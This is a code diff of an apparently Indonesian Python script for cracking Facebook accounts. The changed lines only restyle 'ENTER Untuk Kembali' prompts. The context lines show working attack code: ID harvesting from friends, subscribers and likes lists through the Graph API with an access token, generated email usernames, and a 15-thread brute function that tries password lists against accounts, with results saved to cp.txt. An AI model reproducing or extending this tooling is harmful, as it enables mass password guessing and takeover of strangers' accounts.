@@ -299,7 +299,7 @@ def publik():
 			print((p+"["+k+"*"+p+"]"+p+" Name : "+op["name"]))
 		except KeyError:
 			print((p+"["+k+"!"+p+"]"+p+" ID Tidak Ditemukan"))
-			print((p+"\n[ "+k+"ENTER Untuk Kembali"+p+" ]"+p))
+			print((o+"\n>>> "+k+"ENTER Untuk Kembali"+p+" <<<"+o))
 			publik()
 		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
 		id = []
@@ -330,7 +330,7 @@ def follow():
 			print((p+"["+k+"*"+p+"]"+p+" Name : "+op["name"]))
 		except KeyError:
 			print((p+"["+k+"!"+p+"]"+p+" ID Tidak Ditemukan"))
-			print((p+"\n[ "+k+"ENTER Untuk Kembali"+p+" ]"+p))
+			print((o+"\n>>> "+k+"ENTER Untuk Kembali"+p+" <<<"+o))
 			publik()
 		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
 		id = []
@@ -361,7 +361,7 @@ def likers():
 			print((p+"["+k+"*"+p+"]"+p+" Name : "+op["name"]))
 		except KeyError:
 			print((p+"["+k+"!"+p+"]"+p+" ID Tidak Ditemukan"))
-			print((p+"\n[ "+k+"ENTER Untuk Kembali"+p+" ]"+p))
+			print((o+"\n>>> "+k+"ENTER Untuk Kembali"+p+" <<<"+o))
 			publik()
 		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
 		id = []
@@ -410,7 +410,7 @@ def random_email():
   [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
   with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
     {th.submit(brute, user['user'], user['pw']): user for user in data}
-  input(p+"\n[ "+k+"ENTER Untuk Kembali"+p+" ]"+p)
+  input(o+"\n>>> "+k+"ENTER Untuk Kembali"+p+" <<<"+o)
   menu()
 
 def brute(user, passs):
@@ -513,10 +513,10 @@ def target():
 				print((p+"["+k+"*"+p+"]"+p+" Terakhir Update	: -"))
 			except IOError:
 				print((p+"["+k+"*"+p+"]"+p+" Terakhir Update	: -"))
-			input(p+"\n[ "+k+"ENTER Untuk Kembali"+p+" ]"+p)
+			input(o+"\n>>> "+k+"ENTER Untuk Kembali"+p+" <<<"+o)
 			menu()
 		except KeyError:
-			input(p+"\n[ "+k+"ENTER Untuk Kembali"+p+" ]"+p)
+			input(o+"\n>>> "+k+"ENTER Untuk Kembali"+p+" <<<"+o)
 			menu()
 	except Exception as e:
 		exit(p+"["+k+"!"+p+"]"+p+" Error : %s"%e)
@@ -791,7 +791,7 @@ def ress():
         os.system("cat cp.txt")
     except IOError:
         print((p+"["+k+"!"+p+"]"+p+" Tidak Ada Hasil Ditemukan"))
-    input(p+"\n>> "+k+"ENTER Untuk Kembali"+p+" <<"+p)
+    input(o+"\n>>> "+k+"ENTER Untuk Kembali"+p+" <<<"+o)
     menu()
 
 if __name__=="__main__":
